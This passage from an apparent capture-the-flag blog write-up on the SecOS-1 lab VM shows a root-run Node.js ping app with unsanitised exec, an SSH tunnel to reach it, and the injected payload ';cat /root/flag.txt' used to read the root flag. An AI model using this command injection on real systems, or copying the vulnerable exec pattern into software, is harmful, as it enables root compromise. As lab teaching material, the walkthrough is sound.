-<p>Next thing I did was try to SSH into the box as spiderman, with the password <em>CrazyPassword!</em>. And it worked! In spiderman&rsquo;s home directory, there is a folder called <em>vnwa</em>..a vulnerable web application maybe? I found something potentially interesting buried in the <em>internalServer.js</em> code:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-<span class='line-number'>38</span>
-<span class='line-number'>39</span>
-<span class='line-number'>40</span>
-<span class='line-number'>41</span>
-<span class='line-number'>42</span>
-<span class='line-number'>43</span>
-<span class='line-number'>44</span>
-<span class='line-number'>45</span>
-<span class='line-number'>46</span>
-<span class='line-number'>47</span>
-<span class='line-number'>48</span>
-<span class='line-number'>49</span>
-<span class='line-number'>50</span>
-<span class='line-number'>51</span>
-<span class='line-number'>52</span>
-<span class='line-number'>53</span>
-<span class='line-number'>54</span>
-<span class='line-number'>55</span>
-<span class='line-number'>56</span>
-<span class='line-number'>57</span>
-<span class='line-number'>58</span>
-<span class='line-number'>59</span>
-<span class='line-number'>60</span>
-<span class='line-number'>61</span>
-<span class='line-number'>62</span>
-<span class='line-number'>63</span>
-<span class='line-number'>64</span>
-<span class='line-number'>65</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>spiderman@SecOS-1:~/vnwa$ cat internalServer.js 
-</span><span class='line'>var fs = require('fs');
-</span><span class='line'>var express = require('express');
-</span><span class='line'>var http = require('http');
-</span><span class='line'>var sys = require('sys')
-</span><span class='line'>var exec = require('child_process').exec;
-</span><span class='line'>var crypto = require('crypto');
-</span><span class='line'>
-</span><span class='line'>var utils = require('./lib/utils.js');
-</span><span class='line'>var model = require('./lib/model.js');
-</span><span class='line'>
-</span><span class='line'>var app = express();
-</span><span class='line'>var server = http.createServer(app); 
-</span><span class='line'>
-</span><span class='line'>var logger = function (req, res, next) {
-</span><span class='line'>    console.log(req.connection.remoteAddress + " tried to access : " + req.url);
-</span><span class='line'>    next(); // Passing the request to the next handler in the stack.
-</span><span class='line'>}
-</span><span class='line'>
-</span><span class='line'>// Configuration
-</span><span class='line'>app.configure(function () {
-</span><span class='line'>    // Session management
-</span><span class='line'>    app.use(express.cookieParser());
-</span><span class='line'>    app.use(express.session({secret: 'privateKeyForSession'}));
-</span><span class='line'>    app.use("/js", express.static(__dirname + '/public/js')); // javascript folder
-</span><span class='line'>    app.use("/css", express.static(__dirname + '/public/css')); // javascript folder
-</span><span class='line'>
-</span><span class='line'>    app.set('views', __dirname + '/views'); // views folder
-</span><span class='line'>    app.set('view engine', 'ejs'); // view engine for this projet : ejs 
-</span><span class='line'>
-</span><span class='line'>    app.use(express.bodyParser()); // for POST Requests
-</span><span class='line'>    app.use(logger); // Here you add your logger to the stack.
-</span><span class='line'>    app.use(app.router); // The Express routes handler.
-</span><span class='line'>});
-</span><span class='line'>
-</span><span class='line'>
-</span><span class='line'>app.get('/', function (req, res) {
-</span><span class='line'>    res.render('ping.ejs', {
-</span><span class='line'>        isConnected: req.session.isConnected,
-</span><span class='line'>        isAdmin: req.session.isAdmin
-</span><span class='line'>    });
-</span><span class='line'>});
-</span><span class='line'>
-</span><span class='line'>// Update password
-</span><span class='line'>app.post('/', function (req, res) {
-</span><span class='line'>    ip = req.body.ip
-</span><span class='line'>    if (ip == "") {
-</span><span class='line'>        utils.redirect(req, res, '/ping-status');
-</span><span class='line'>    } else {
-</span><span class='line'>        // getting the command with req.params.command
-</span><span class='line'>        var child;
-</span><span class='line'>        // console.log(req.params.command);
-</span><span class='line'>        child = exec('ping ' + ip, function (error, stdout, stderr) {
-</span><span class='line'>            res.render('ping.ejs', {
-</span><span class='line'>                isConnected: req.session.isConnected,
-</span><span class='line'>                message: stdout,
-</span><span class='line'>                isAdmin: req.session.isAdmin
-</span><span class='line'>            });
-</span><span class='line'>        });
-</span><span class='line'>    }
-</span><span class='line'>});
-</span><span class='line'>
-</span><span class='line'>server.listen(9000, '127.0.0.1', function() {
-</span><span class='line'>  console.log("Listening on port 9000");
-</span><span class='line'>});</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Indeed, this app is listening on port 9000:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>spiderman@SecOS-1:~/vnwa/scripts$ netstat -antp
-</span><span class='line'>(Not all processes could be identified, non-owned process info
-</span><span class='line'> will not be shown, you would have to be root to see it all.)
-</span><span class='line'>Active Internet connections (servers and established)
-</span><span class='line'>Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
-</span><span class='line'>tcp        0      0 127.0.0.1:9000          0.0.0.0:*               LISTEN      -               
-</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>
-
-
-<p>By looking at the code, it seems it&rsquo;s a pinging app. During the enumeration phase, I also noticed that unlike the web server we&rsquo;ve exploited, this internal server is run by root:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>ps aux
-</span><span class='line'>USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
-</span><span class='line'>...
-</span><span class='line'>root       186  0.0  0.1   4692   960 ?        Ss   11:40   0:00 sudo -u spiderman sh -c /usr/local/bin/node /home/spiderman/vnwa/server.js
-</span><span class='line'>root       188  0.0  0.1   4692   956 ?        Ss   11:40   0:00 sudo -u root sh -c /usr/local/bin/node /home/spiderman/vnwa/internalServer.js
-</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>
-
-
-<p>To access this application, I set up a SSH tunnel. On my machine, I ran this command:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>ssh -f -N -L 4444:127.0.0.1:9000 -l spiderman 192.168.80.128</span></code></pre></td></tr></table></div></figure>
-
-
-<p>This allowed me to connect to the remote application on port 9000 from the browser of my Kali machine. Let me break it up:</p>
-
-<ul>
-<li><p><strong>-f</strong> Requests ssh to go to background just before command execution. This is useful if ssh is going to ask for passwords or passphrases, but the user wants it in the background.</p></li>
-<li><p><strong>-N</strong> Do not execute a remote command.  This is useful for just forwarding ports.</p></li>
-<li><p><strong>-L</strong> [bind_address:]port:host:hostport</p></li>
-</ul>
-
-
-<p>Specifies that the given port on the local (client) host is to be
-forwarded to the given host and port on the remote side.  This
-works by allocating a socket to listen to <strong>port</strong> on the local side,
-optionally bound to the specified <strong>bind_address</strong>.  Whenever a connection is made to this port, the connection is forwarded over
-the secure channel, and a connection is made to <strong>host</strong> port
-<strong>hostport</strong> from the remote machine.</p>
-
-<ul>
-<li><p><strong>-l</strong> Specifies the user to log in as on the remote machine.</p></li>
-<li><p><strong>192.168.80.128</strong> The IP address of the SecOS box</p></li>
-</ul>
-
-
-<p>What this did was forwarding the connections to port 4444 on my local machine to the remote server on port 9000. Remember that the application is only listening on the localhost interface on the SecOS box. So, the SecOS machine is acting as a sort of gateway, tunneling the connections I point to my 4444 port to the 9000 port on localhost. You can read some more about how this works on <a href="http://en.wikibooks.org/wiki/OpenSSH/Cookbook/Tunnels">http://en.wikibooks.org/wiki/OpenSSH/Cookbook/Tunnels</a></p>
-
-<p>Now, in my browser, I went to <a href="http://127.0.0.1:4444/">http://127.0.0.1:4444/</a> and:</p>
-
-<p><img class="center" src="http://chousensha.github.io/images/pentest/secos/ping.png" title="ping" alt="ping"></p>
-
-<p>I tried pinging my Kali machine to see if it works but it just appeared to hang. So I tried limiting the amount of pings by entering <code>-c 2</code> after the IP to be pinged. And it worked!</p>
-
-<p><img class="center" src="http://chousensha.github.io/images/pentest/secos/pingres.png" title="ping result" alt="ping result"></p>
-
-<p>We know the ping app is running as root, so if we can do remote code execution, we&rsquo;ll be able to run commands as root. And the application is vulnerable to just what we need! Remember these lines from the internal server code:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="nx">ip</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">ip</span>
-</span><span class='line'><span class="nx">child</span> <span class="o">=</span> <span class="nx">exec</span><span class="p">(</span><span class="s1">&#39;ping &#39;</span> <span class="o">+</span> <span class="nx">ip</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">error</span><span class="p">,</span> <span class="nx">stdout</span><span class="p">,</span> <span class="nx">stderr</span><span class="p">)</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>The <em>ip</em> variable is passed to the <em>exec</em> function without any prior input sanitization. So, we just close the first command (which would be the ping), and insert an additional command of our choosing, which in this case will be to read the flag:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>;cat /root/flag.txt</span></code></pre></td></tr></table></div></figure>
-
-
-<p>And profit!</p>
-
-<p><img class="center" src="http://chousensha.github.io/images/pentest/secos/win.png" title="flag" alt="flag"></p>
-
-<blockquote><p>Don&rsquo;t tell any big lies today.  Small ones can be just as effective.</p></blockquote>
 ]]></content>
   </entry>
   
